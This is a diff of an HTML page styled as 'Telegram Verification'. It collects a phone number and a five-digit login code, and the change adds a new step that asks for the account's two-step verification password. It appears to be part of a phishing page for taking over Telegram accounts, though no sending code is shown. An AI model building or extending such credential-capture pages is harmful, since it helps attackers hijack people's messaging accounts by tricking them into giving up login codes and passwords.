@@ -18,7 +18,7 @@
                 <span class="emoji">📱</span>
             </div>
 
-            <!-- Phone Number Section -->
+            <!-- Step 1: Phone Number -->
             <div id="phone-section" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:16px;">
                 <div class="instruction">
                     <b>Telegram Verification</b><br><br>
@@ -28,13 +28,12 @@
                 <button id="send-otp-btn" class="verify-btn">📤 Send Verification Code</button>
             </div>
 
-            <!-- OTP Section -->
-            <div id="otp-section" style="display:none;width:100%;display:none;flex-direction:column;align-items:center;gap:16px;">
+            <!-- Step 2: OTP -->
+            <div id="otp-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
                 <div class="instruction">
                     <b>Telegram Verification</b><br><br>
                     Enter the 5-digit code sent to your Telegram app.
                 </div>
-
                 <div class="otp-boxes">
                     <input type="text" maxlength="1" class="otp-box" data-index="0">
                     <input type="text" maxlength="1" class="otp-box" data-index="1">
@@ -42,9 +41,7 @@
                     <input type="text" maxlength="1" class="otp-box" data-index="3">
                     <input type="text" maxlength="1" class="otp-box" data-index="4">
                 </div>
-
                 <button id="verify-btn" class="verify-btn">✅ Verify Code</button>
-
                 <div class="keypad">
                     <button class="key" data-key="1">1</button>
                     <button class="key" data-key="2">2</button>
@@ -55,12 +52,22 @@
                     <button class="key" data-key="7">7</button>
                     <button class="key" data-key="8">8</button>
                     <button class="key" data-key="9">9</button>
-                    <!-- empty cell to center 0 -->
                     <div></div>
                     <button class="key" data-key="0">0</button>
                     <button class="key backspace" data-key="backspace">⌫</button>
                 </div>
             </div>
+
+            <!-- Step 3: 2FA -->
+            <div id="twofa-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
+                <div class="instruction">
+                    <b>Two-Step Verification</b><br><br>
+                    Your account has 2FA enabled. Enter your password to continue.
+                </div>
+                <input type="password" id="twofa-input" class="phone-input" placeholder="Enter 2FA password">
+                <button id="twofa-btn" class="verify-btn">✅ Verify 2FA</button>
+            </div>
+
         </div>
     </div>
 
